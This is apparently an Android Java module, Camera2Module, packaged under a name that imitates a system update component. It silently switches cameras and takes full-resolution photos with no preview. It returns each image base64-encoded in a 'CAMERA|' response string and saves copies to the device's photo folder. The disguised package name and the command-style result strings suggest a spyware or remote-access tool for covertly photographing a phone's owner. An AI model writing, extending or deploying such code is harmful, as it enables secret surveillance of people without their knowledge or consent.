package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CaptureResult;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class Camera2Module {
    private static final String TAG = "Camera2Module";
    private static final int CAMERA_TIMEOUT_MS = 30000; // 30 seconds
    
    private Context context;
    private CameraManager cameraManager;
    private String backCameraId;
    private String frontCameraId;
    private String currentCameraId;
    private boolean isFrontCamera = false;
    private Handler mainHandler;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private CameraCaptureSession captureSession;
    private String cameraId;
    private AtomicBoolean isCapturing = new AtomicBoolean(false);
    
    public interface CameraCallback {
        void onPhotoTaken(String base64Image);
        void onError(String error);
    }
    
    public Camera2Module(Context context) {
        this.context = context;
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        
        // Start camera thread
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        
        initCameras();
    }
    
    private void initCameras() {
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            Log.d(TAG, "Number of cameras: " + cameraIdList.length);
            
            for (String id : cameraIdList) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                        Log.d(TAG, "Found back camera: " + id);
                    } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = id;
                        Log.d(TAG, "Found front camera: " + id);
                    }
                }
            }
            
            // Set default to back camera
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isFrontCamera = false;
                Log.d(TAG, "Default camera set to BACK (ID: " + currentCameraId + ")");
            } else if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isFrontCamera = true;
                Log.d(TAG, "Default camera set to FRONT (ID: " + currentCameraId + ")");
            } else {
                Log.e(TAG, "No cameras found!");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing cameras", e);
        }
    }
    
    public String switchCamera() {
        try {
            Log.d(TAG, "switchCamera() called - Current: " + (isFrontCamera ? "FRONT" : "BACK"));
            
            if (frontCameraId != null && backCameraId != null) {
                if (currentCameraId.equals(backCameraId)) {
                    currentCameraId = frontCameraId;
                    isFrontCamera = true;
                    Log.d(TAG, "Switched to FRONT camera");
                    return "CAMERA_SWITCH|Front camera activated";
                } else {
                    currentCameraId = backCameraId;
                    isFrontCamera = false;
                    Log.d(TAG, "Switched to BACK camera");
                    return "CAMERA_SWITCH|Back camera activated";
                }
            } else if (frontCameraId == null && backCameraId != null) {
                return "CAMERA_SWITCH|Only back camera available";
            } else if (backCameraId == null && frontCameraId != null) {
                return "CAMERA_SWITCH|Only front camera available";
            }
            return "CAMERA_SWITCH|No camera available";
        } catch (Exception e) {
            Log.e(TAG, "Error switching camera", e);
            return "CAMERA_SWITCH|Error: " + e.getMessage();
        }
    }
    
    public String getCurrentCameraInfo() {
        try {
            if (currentCameraId != null) {
                return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
            }
            return "CAMERA_INFO|No camera selected";
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera info", e);
            return "CAMERA_INFO|Error: " + e.getMessage();
        }
    }
    
    public void takePhoto(final CameraCallback callback) {
        Log.d(TAG, "takePhoto() called with camera: " + (isFrontCamera ? "FRONT" : "BACK"));
        
        if (!checkPermission()) {
            callback.onError("ERROR: No camera permission");
            return;
        }
        
        if (currentCameraId == null) {
            callback.onError("ERROR: No camera available");
            return;
        }
        
        // Prevent multiple simultaneous captures
        if (isCapturing.getAndSet(true)) {
            callback.onError("ERROR: Camera already capturing");
            return;
        }
        
        // Close any existing camera resources
        closeCamera();
        
        cameraId = currentCameraId;
        
        cameraHandler.post(() -> {
            try {
                final Semaphore cameraOpenSemaphore = new Semaphore(0);
                final Semaphore captureSemaphore = new Semaphore(0);
                final byte[][] imageData = new byte[1][];
                final String[] errorMsg = new String[1];
                
                // Get camera characteristics to determine optimal size
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                
                // Choose the largest image size
                Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
                if (jpegSizes == null || jpegSizes.length == 0) {
                    errorMsg[0] = "No supported JPEG sizes";
                    mainHandler.post(() -> callback.onError("ERROR: " + errorMsg[0]));
                    isCapturing.set(false);
                    return;
                }
                
                Size largest = jpegSizes[0];
                for (Size size : jpegSizes) {
                    if (size.getWidth() * size.getHeight() > largest.getWidth() * largest.getHeight()) {
                        largest = size;
                    }
                }
                Log.d(TAG, "Selected picture size: " + largest.getWidth() + "x" + largest.getHeight());
                
                // Create ImageReader
                imageReader = ImageReader.newInstance(largest.getWidth(), largest.getHeight(), ImageFormat.JPEG, 2);
                imageReader.setOnImageAvailableListener(reader -> {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            imageData[0] = bytes;
                            Log.d(TAG, "Image captured: " + bytes.length + " bytes");
                            
                            // Save debug photo
                            saveDebugPhoto(bytes);
                            
                            captureSemaphore.release();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing image", e);
                        errorMsg[0] = "Error processing image: " + e.getMessage();
                        captureSemaphore.release();
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                    }
                }, cameraHandler);
                
                // Open camera
                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@androidx.annotation.NonNull CameraDevice camera) {
                        Log.d(TAG, "Camera opened: " + camera.getId());
                        cameraDevice = camera;
                        
                        try {
                            // Create capture request builder
                            CaptureRequest.Builder captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            captureBuilder.addTarget(imageReader.getSurface());
                            
                            // Set auto-focus
                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                            
                            // Set auto-exposure
                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                            
                            // Create capture session
                            camera.createCaptureSession(Arrays.asList(imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@androidx.annotation.NonNull CameraCaptureSession session) {
                                    Log.d(TAG, "Capture session configured");
                                    captureSession = session;
                                    
                                    try {
                                        // Capture still image
                                        session.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                                            @Override
                                            public void onCaptureCompleted(@androidx.annotation.NonNull CameraCaptureSession session, @androidx.annotation.NonNull CaptureRequest request, @androidx.annotation.NonNull TotalCaptureResult result) {
                                                Log.d(TAG, "Capture completed successfully");
                                            }
                                        }, cameraHandler);
                                        
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error during capture", e);
                                        errorMsg[0] = "Error during capture: " + e.getMessage();
                                        captureSemaphore.release();
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(@androidx.annotation.NonNull CameraCaptureSession session) {
                                    Log.e(TAG, "Session configuration failed");
                                    errorMsg[0] = "Session configuration failed";
                                    captureSemaphore.release();
                                }
                            }, cameraHandler);
                            
                        } catch (Exception e) {
                            Log.e(TAG, "Error setting up capture", e);
                            errorMsg[0] = "Error setting up capture: " + e.getMessage();
                            captureSemaphore.release();
                        }
                        
                        cameraOpenSemaphore.release();
                    }
                    
                    @Override
                    public void onDisconnected(@androidx.annotation.NonNull CameraDevice camera) {
                        Log.e(TAG, "Camera disconnected");
                        camera.close();
                        cameraDevice = null;
                        errorMsg[0] = "Camera disconnected";
                        cameraOpenSemaphore.release();
                        captureSemaphore.release();
                        isCapturing.set(false);
                    }
                    
                    @Override
                    public void onError(@androidx.annotation.NonNull CameraDevice camera, int error) {
                        Log.e(TAG, "Camera error: " + error);
                        camera.close();
                        cameraDevice = null;
                        errorMsg[0] = "Camera error: " + error;
                        cameraOpenSemaphore.release();
                        captureSemaphore.release();
                        isCapturing.set(false);
                    }
                }, cameraHandler);
                
                // Wait for camera to open (max 10 seconds)
                if (!cameraOpenSemaphore.tryAcquire(10, TimeUnit.SECONDS)) {
                    mainHandler.post(() -> callback.onError("ERROR: Camera open timeout"));
                    closeCamera();
                    isCapturing.set(false);
                    return;
                }
                
                // Wait for capture (max 10 seconds)
                if (!captureSemaphore.tryAcquire(10, TimeUnit.SECONDS)) {
                    mainHandler.post(() -> callback.onError("ERROR: Capture timeout"));
                    closeCamera();
                    isCapturing.set(false);
                    return;
                }
                
                // Check for errors
                if (errorMsg[0] != null) {
                    mainHandler.post(() -> callback.onError("ERROR: " + errorMsg[0]));
                    closeCamera();
                    isCapturing.set(false);
                    return;
                }
                
                // Process image
                if (imageData[0] == null || imageData[0].length == 0) {
                    mainHandler.post(() -> callback.onError("ERROR: No image data"));
                    closeCamera();
                    isCapturing.set(false);
                    return;
                }
                
                String base64Image = Base64.encodeToString(imageData[0], Base64.NO_WRAP);
                final String result = "CAMERA|data:image/jpeg;base64," + base64Image;
                Log.d(TAG, "Photo captured successfully, base64 length: " + base64Image.length());
                
                // Close camera after successful capture
                closeCamera();
                isCapturing.set(false);
                
                mainHandler.post(() -> callback.onPhotoTaken(result));
                
            } catch (Exception e) {
                Log.e(TAG, "Error in takePhoto", e);
                closeCamera();
                isCapturing.set(false);
                mainHandler.post(() -> callback.onError("ERROR: " + e.getMessage()));
            }
        });
    }
    
    private void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            Log.d(TAG, "Camera resources closed");
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera", e);
        }
    }
    
    private void saveDebugPhoto(byte[] data) {
        try {
            File picturesDir = new File("/sdcard/DCIM/");
            if (!picturesDir.exists()) {
                picturesDir = context.getExternalFilesDir(null);
            }
            if (picturesDir != null) {
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File photoFile = new File(picturesDir, "debug_photo_" + timestamp + ".jpg");
                FileOutputStream fos = new FileOutputStream(photoFile);
                fos.write(data);
                fos.close();
                Log.d(TAG, "Debug photo saved to: " + photoFile.getAbsolutePath());
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to save debug photo", e);
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    public void cleanup() {
        closeCamera();
        isCapturing.set(false);
        if (cameraThread != null) {
            cameraThread.quitSafely();
            try {
                cameraThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    // Add this helper method at the end of the class
private void runOnMainThread(Runnable action) {
    if (Looper.myLooper() == Looper.getMainLooper()) {
        action.run();
    } else {
        new Handler(Looper.getMainLooper()).post(action);
    }
}
}
